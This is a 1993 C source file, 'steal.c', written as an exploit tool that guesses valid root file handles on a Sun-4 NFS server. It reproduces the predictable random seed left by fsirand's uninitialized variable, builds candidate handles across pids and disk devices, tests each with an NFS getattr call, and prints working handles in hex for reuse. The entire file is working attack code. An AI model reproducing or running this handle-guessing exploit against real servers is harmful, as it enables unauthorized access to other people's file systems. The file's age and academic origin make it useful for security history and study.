/*
 * @(#)steal.c	1.1 17 Aug 1993
 *
 * Copyright (c) 1993 by Leendert van Doorn <leendert@cs.vu.nl>
 * All rights reserved.
 *
 * This material is copyrighted by Leendert van Doorn, january 1992. The usual
 * standard disclaimer applies, especially the fact that the author nor the
 * Vrije Universiteit, Amsterdam are liable for any damages caused by direct or
 * indirect usage of the information or functionality provided in this material.
 * Permission is hereby granted to use and publish this material and information
 * contained in this document provided that the above copyright is acknowledged.
 */
/*
 * steal - try to steal handles from a sun-4 NFS file server
 */
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/vnode.h>
#include <sys/vfs.h>
#ifdef SYSV
#include <sys/inode.h>
#else
#include <ufs/inode.h>
#endif
#include "mount.h"
#include "nfs_prot.h"

/*
 * This random seed is the constant value that the
 * uninitialized variable ``timeval'' in fsirand contains.
 */
#define	SUN4_RANDOM	(0 + 32)

/*
 * Disk device descriptor (major/minor)
 */
#define	DSK_NMIN	16
struct disk {
    int dsk_maj;		/* major disk device number */
    int dsk_min[16];		/* minor device table */
};

/*
 * Device descriptor
 */
#define	DEV_NDISKS	2
struct device {
    long dev_random;		/* machine specific random seed */
    int dev_pid;		/* maximum pid to look at */
    struct disk dev_disks[DEV_NDISKS]; /* disk table */
};

struct device device = {
    { SUN4_RANDOM, 2000,
	{ 10, 	/* /dev/xd[01][a-h] */
	    { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
	{ 7, 	/* /dev/sd[01][a-h] */
	    { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
    },
};

/*
 * File system types, these correspond to entries in fsconf
 */
#define MOUNT_UFS       1
#define MOUNT_NFS       2
#define MOUNT_PC        3
#define MOUNT_LO        4
#define MOUNT_TFS       5
#define MOUNT_TMP       6

/*
 * This struct is only used to find the size of the data field in the
 * fhandle structure below.
 */
static struct fhsize {
    fsid_t  f1;
    u_short f2;
    char    f3[4];
    u_short f4;
    char    f5[4];
};
#define NFS_FHMAXDATA   ((NFS_FHSIZE - sizeof (struct fhsize) + 8) / 2)

struct svcfh {
    fsid_t  fh_fsid;                /* filesystem id */
    u_short fh_len;                 /* file number length */
    char    fh_data[NFS_FHMAXDATA]; /* and data */
    u_short fh_xlen;                /* export file number length */
    char    fh_xdata[NFS_FHMAXDATA]; /* and data */
};

struct timeval timeout = { 60, 0 };
struct sockaddr_in server_addr;
CLIENT *client;

int handleok();
long random();

main(argc, argv)
    int argc;
    char **argv;
{
    register int pid;
    int sock = RPC_ANYSOCK;
    char *host;

    if (argc != 2) {
	fprintf(stderr, "Usage: %s host\n", argv[0]);
	exit(1);
    }
    host = argv[1];

    /* convert hostname to IP address */
    if (isdigit(*host)) {
	server_addr.sin_addr.s_addr = inet_addr(host);
    } else {
	struct hostent *hp = gethostbyname(host);
	if (hp == NULL) {
	    fprintf(stderr, "%s: unknown host\n", host);
	    exit(1);
	}
	bcopy(hp->h_addr, &server_addr.sin_addr.s_addr, hp->h_length);
	host = hp->h_name;
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = 0;

    /* setup communication channel with NFS daemon */
    if ((client = clntudp_create(&server_addr,
	NFS_PROGRAM, NFS_VERSION, timeout, &sock)) == NULL) {
	clnt_pcreateerror(host);
	exit(1);
    }
    clnt_control(client, CLSET_TIMEOUT, &timeout);
    client->cl_auth = authunix_create_default(-2, -2);

    /*
     * For every likely process id, search through the list
     * of likely devices and create a handle. Since the pid's
     * used in fsirand are often low (<1000), it makes more
     * sense to go through the devices first.
     */
    for (pid = 0; pid <= device.dev_pid; pid++) {
	register int n, dsk;
	long gen;

	/* initialize generation generator */
	srandom(1);
	srandom(pid + device.dev_random);
	n = pid;
	while (n--) (void) random();

	if ((pid % 100) == 0) printf("\tpid = %d\n", pid);

	/* compute generation # for inode 2 */
	(void) random(); /* inode 0 */
	(void) random(); /* inode 1 */
	gen = random();

	/*
	 * Try every disk controler
	 */
	for (dsk = 0; dsk < DEV_NDISKS; dsk++) {
	    register struct disk *dp = &device.dev_disks[dsk];
	    register int min, maj = dp->dsk_maj;

	    /*
	     * Try every disk. A minor number of -1 indicates that
	     * it has already been guessed.
	     */
	    for (min = 0; min < DSK_NMIN; min++) {
		fhandle handle;

		if(dp->dsk_min[min] == -1) continue;
		makehandle(handle, maj, dp->dsk_min[min], 2, gen, 2, gen);
		if (handleok(handle)) {
		    dp->dsk_min[min] = -1;
		    printhandle(handle);
		    break;
		}
	    }
	}
    }

    auth_destroy(client->cl_auth);
    clnt_destroy(client);
    exit(0);
}

/*
 * Create a handle
 */
makehandle(handle, maj, min, inum, gen, rinum, rgen)
    struct svcfh *handle;
    int maj, min;
    long inum, gen;
    long rinum, rgen;
{
    handle->fh_fsid.val[0] = makedev(maj, min);
    handle->fh_fsid.val[1] = MOUNT_UFS;

    handle->fh_len = 10;
    *((u_short *)&handle->fh_data[0]) = 0;	/* length */
    *((ino_t *)&handle->fh_data[2]) = inum;	/* inode */
    *((long *)&handle->fh_data[6]) = gen;	/* generation number */

    handle->fh_xlen = 10;
    *((u_short *)&handle->fh_xdata[0]) = 0;	/* length */
    *((ino_t *)&handle->fh_xdata[2]) = rinum;	/* inode */
    *((long *)&handle->fh_xdata[6]) = rgen;	/* generation number */
}

/*
 * Just use some fast nfs rpc to check out the
 * correctness of the handle.
 */
int
handleok(handle)
    fhandle *handle;
{
    attrstat *res;

    if ((res = nfsproc_getattr_2(handle, client)) == NULL)
	return 0;
    if (res->status != NFS_OK)
	return 0;
    return 1;
}

printhandle(handle)
    struct svcfh *handle;
{
    register char *p;
    register int i;

    /* fsid[0] -> major, minor device number */
    fprintf(stderr, "\t(%d,%d) ",
	major(handle->fh_fsid.val[0]), minor(handle->fh_fsid.val[0]));

    /* fsid[1] -> file system type */
    switch (handle->fh_fsid.val[1]) {
    case MOUNT_UFS: fprintf(stderr, "ufs "); break;
    case MOUNT_NFS: fprintf(stderr, "nfs "); break;
    case MOUNT_PC:  fprintf(stderr, "pcfs "); break;
    case MOUNT_LO:  fprintf(stderr, "lofs "); break;
    case MOUNT_TFS: fprintf(stderr, "tfs "); break;
    case MOUNT_TMP: fprintf(stderr, "tmp "); break;
    default:	    fprintf(stderr, "unknown "); break;
    }

    /* file number length, and data */
    fprintf(stderr, "<%d,%ld,%ld> ",
	*((u_short *)&handle->fh_data[0]),
	*((ino_t *)&handle->fh_data[2]),
	*((long *)&handle->fh_data[6]));

    /* export file number length, and data */
    fprintf(stderr, "<%d,%ld,%ld>\n",
	*((u_short *)&handle->fh_xdata[0]),
	*((ino_t *)&handle->fh_xdata[2]),
	*((long *)&handle->fh_xdata[6]));

    /* print handle in hex-decimal format (as input for nfs) */
    fprintf(stderr, "handle:");
    for (i = 0, p = (char *)handle; i < sizeof(struct svcfh); i++, p++)
	fprintf(stderr, " %02x", *p & 0xFF);
    fprintf(stderr, "\n");
}

/*
 * Returns an auth handle with parameters determined by
 * doing lots of syscalls.
 */
AUTH *
authunix_create_default(uid, gid)
    int uid, gid;
{
    char machname[MAX_MACHINE_NAME + 1];
    int gids[1];

    if (gethostname(machname, MAX_MACHINE_NAME) == -1) {
	fprintf(stderr, "authunix_create_default: cannot get hostname\n");
	exit(1);
    }
    machname[MAX_MACHINE_NAME] = 0;
    gids[0] = gid;
    return (authunix_create(machname, uid, gid, 1, gids));
}
